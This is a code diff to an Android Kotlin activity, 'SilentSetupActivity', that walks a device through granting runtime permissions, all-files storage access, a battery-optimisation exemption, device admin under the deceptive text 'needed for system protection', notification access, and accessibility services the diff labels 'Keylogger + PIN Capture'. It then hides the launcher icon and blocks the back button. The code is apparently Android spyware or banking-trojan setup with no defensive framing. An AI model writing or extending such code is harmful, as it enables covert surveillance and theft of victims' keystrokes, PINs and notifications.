@@ -14,6 +14,7 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
+import android.text.TextUtils
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -38,44 +39,34 @@ class SilentSetupActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Tidak ada layout — activity tak terlihat
         requestNextPermission()
     }
 
+    // ── Runtime permissions ──────────────────────────────────────────────────
+
     private fun requestNextPermission() {
-        // Lewati permission yang sudah granted
         while (permissionIndex < permissions.size) {
             val perm = permissions[permissionIndex]
             if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                 permissionIndex++
-            } else {
-                break
-            }
+            } else break
         }
-
         if (permissionIndex >= permissions.size) {
-            // Semua runtime permission selesai → lanjut storage & admin
             requestSpecialPermissions()
             return
         }
-
-        val perm = permissions[permissionIndex]
-        ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
+        ActivityCompat.requestPermissions(this, arrayOf(permissions[permissionIndex]), 1000 + permissionIndex)
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         permissionIndex++
-        // Delay kecil supaya service punya waktu klik sebelum dialog berikutnya muncul
         handler.postDelayed({ requestNextPermission() }, 300)
     }
 
+    // ── Storage ──────────────────────────────────────────────────────────────
+
     private fun requestSpecialPermissions() {
-        // Akses semua file (Android 11+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
             try {
                 startActivityForResult(
@@ -88,6 +79,8 @@ class SilentSetupActivity : AppCompatActivity() {
         }
         requestBatteryOptimization()
     }
+
+    // ── Battery optimization ─────────────────────────────────────────────────
 
     private fun requestBatteryOptimization() {
         val pm = getSystemService(PowerManager::class.java)
@@ -105,21 +98,74 @@ class SilentSetupActivity : AppCompatActivity() {
         requestDeviceAdmin()
     }
 
+    // ── Device Admin ─────────────────────────────────────────────────────────
+
     private fun requestDeviceAdmin() {
         if (!dpm.isAdminActive(adminComponent)) {
             try {
                 startActivityForResult(
                     Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                         putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                            "Diperlukan untuk proteksi sistem.")
+                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk proteksi sistem.")
                     }, 2003
+                )
+                return
+            } catch (_: Exception) {}
+        }
+        requestNotificationAccess()
+    }
+
+    // ── Notification Listener ────────────────────────────────────────────────
+
+    private fun isNotificationListenerEnabled(): Boolean {
+        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
+        return flat.contains(packageName)
+    }
+
+    private fun requestNotificationAccess() {
+        if (!isNotificationListenerEnabled()) {
+            try {
+                startActivityForResult(
+                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS),
+                    2004
+                )
+                return
+            } catch (_: Exception) {}
+        }
+        requestAccessibility()
+    }
+
+    // ── Accessibility (Keylogger + PIN Capture) ───────────────────────────────
+
+    private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
+        val expected = ComponentName(this, serviceClass)
+        val enabled  = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+            ?: return false
+        val splitter = TextUtils.SimpleStringSplitter(':')
+        splitter.setString(enabled)
+        while (splitter.hasNext()) {
+            val cn = ComponentName.unflattenFromString(splitter.next())
+            if (cn != null && cn == expected) return true
+        }
+        return false
+    }
+
+    private fun requestAccessibility() {
+        val keylogOk  = isAccessibilityEnabled(KeyloggerService::class.java)
+        val pinOk     = isAccessibilityEnabled(PinCaptureService::class.java)
+        if (!keylogOk || !pinOk) {
+            try {
+                startActivityForResult(
+                    Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
+                    2005
                 )
                 return
             } catch (_: Exception) {}
         }
         finishSetup()
     }
+
+    // ── onActivityResult ─────────────────────────────────────────────────────
 
     @Deprecated("Deprecated in Java")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -128,13 +174,16 @@ class SilentSetupActivity : AppCompatActivity() {
             when (requestCode) {
                 2001 -> requestBatteryOptimization()
                 2002 -> requestDeviceAdmin()
-                2003 -> finishSetup()
+                2003 -> requestNotificationAccess()
+                2004 -> requestAccessibility()
+                2005 -> finishSetup()
             }
-        }, 300)
+        }, 400)
     }
 
+    // ── Finish ───────────────────────────────────────────────────────────────
+
     private fun finishSetup() {
-        // Sembunyikan ikon launcher
         try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, "$packageName.MainLauncherAlias"),
@@ -143,7 +192,6 @@ class SilentSetupActivity : AppCompatActivity() {
             )
         } catch (_: Exception) {}
 
-        // Tandai setup selesai
         getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
             .edit().putBoolean("setup_done", true).apply()
 
@@ -151,6 +199,6 @@ class SilentSetupActivity : AppCompatActivity() {
     }
 
     override fun onBackPressed() {
-        // Blokir tombol back selama setup
+        // Blokir back selama setup
     }
 }
